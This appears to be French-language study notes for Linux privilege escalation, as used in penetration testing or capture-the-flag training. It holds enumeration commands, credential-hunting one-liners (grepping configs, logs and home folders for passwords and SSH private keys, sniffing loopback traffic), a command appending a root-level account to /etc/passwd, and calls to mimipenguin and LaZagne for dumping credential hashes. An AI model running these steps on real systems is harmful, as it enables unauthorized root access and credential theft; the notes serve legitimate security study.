# Privilèges
Tout est un fichier, même le matériel. Ils répondent donc aux permissions standards de fichiers
r -	read
w	- write
x	- execute
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-rw-r----- 1 root shadow 1751 May  2 09:31 /etc/shadow
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Propriétaire: root - groupe: shadow
Premier trait est le type. Suivis de 3 groupes de 3. Propriétaire, Groupe du Propriétaire, autre

# Énumération
* Nom et groupe:  ```id```
* usagers: 	```cat /etc/passwd```
	* login_name : encrypted_password : UID : GID : comment : home folder : login_shell
	* encrypted_password x si dans /etc/shadow
	* nologin si peut pas se connecter
* nom de machine: ```hostname```
* système:
	```shell
	cat /etc/issue
	cat /etc/os-release
	uname -a
	arch
	```
* Processus:
	```shell
	ps aux
	#suivre en temps réel
	watch -n 1 "ps -aux | grep pass"
	#Très efficace si accessible
	./pspy
	```
##  Tâches
 **cron** est l'ordonanceur de tâches sous Linux
* ```ls -lah /etc/cron*```   cron.daily, cron.hourly, ...
* ```crontab -l``` 	tâches de l'utilisateur courrant (utiliser aussi avec sudo)
* ```grep "CRON" /var/log/syslog```
* ```tail -f /var/log/cron.log```

## Applications et packages
```dpkg -l```	Debian

## Fichiers en écriture
* dossiers ```find / -writable -type d 2>/dev/null | grep -v "/proc*"```
* fichiers ```find / -writable -type f 2>/dev/null | grep -v "/proc*"```
* fichiers de l'utilisateur: `-user [username]`
* fichiers de groupes: `-group [group]`

## Disques
```mount```
```cat /etc/fstab```	fichiers montés au lancement
```lsblk```	disques et partitions disponibles

## Kernel modules
```lsmod```			liste
```/sbin/modinfo [module]```	détails

## SUID et GUID
Permet d'exécuter comme propriétraire ou groupe du fichier. “s” ou “S” dans les droits
SUID ```find / -perm -u=s -type f 2>/dev/null```
GUID ```find / -perm -g=s -type f 2>/dev/null```

## Capabilities
Permet de donner certains droits pour certaines actions dangereuses au processus
```/usr/sbin/getcap -r / 2>/dev/null```
**cap_setuid+ep** est très intéressant

## SUDO
Dans /etc/sudoers
Droits de l'usager courant: ```sudo -l```

**utiliser GTFOBins pour savoir comment les abuser**

## Traces usagers
Vérifier dossiers utilisateurs
Variables d'environment: ```env```
**.bashrc** fichier de config bash
**.bash_history** pour l'historique bash

## Config de serveur web
* Regarder les fichiers de config web
* /etc/hosts

## Réseau
Adapteurs réseau:
* ```ifconfig```
* ```ip a```
routes: 
* ```route```
* ```routel```
connexions actives:
* ```netstat```
* ```ss -anp```
Autres:
```
ss -t state listening
netstat -antup
netstat -tunlp
```
tcpdump peut attraper du traffique intéressant
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
tcpdump -i lo -A | grep "pass"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## Firewall
```iptables``` (requière root)
```iptables-persistent``` package sauvegarde dans fichiers ```/etc/iptables``` par défaut
commande ```iptables-save``` sauvarge certains fichiers


https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://book.hacktricks.xyz/linux-hardening/privilege-escalation

# Automatisation
/usr/bin/unix-privesc-check
LinEnum
/usr/share/peass/linpeas/linpeas*

# Syslog
```cat /var/log/syslog | grep -i <ce que tu veux>```

# Recherche de fichiers
Nom du fichier
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#récursive sans casse
find /mnt/Finance/ -name *cred*
#simple
find *cred*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Cherche dans le contenu
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
grep -rn /mnt/Finance/ -ie cred
#Limite le contenu
grep -r -E -o ".{0,10}pass.{0,10}"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Combinaisons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
#HtB cherche .conf .config  .cnf
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
#HtB Cherche user, password ou pass dans les .cnf
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
#HtB Cherche dans fichier db
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
#clef SSH (Utilise mots contenue dans une clef)
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
#mots intéressant dans les logs
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Mot de passe
Dans /etc/shadow, mais /etc/passwd prend précéence si il contient un hash.
Si on peut écrire, il est facile de créer un nouvel utilisateur ou changer un mot de passe

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#générer un hash de mot de passe avec algorithm crypt
openssl passwd w00t
#hash généré: Fdzt.eqJQ4s0g
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Utiliser mimipenguin pour extraire des hash en mémoire, doit être admin
```shell-session
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh 
```
Lazagne pour extraire hash de différentes sources
```shell-session
sudo python laZagne.py all
```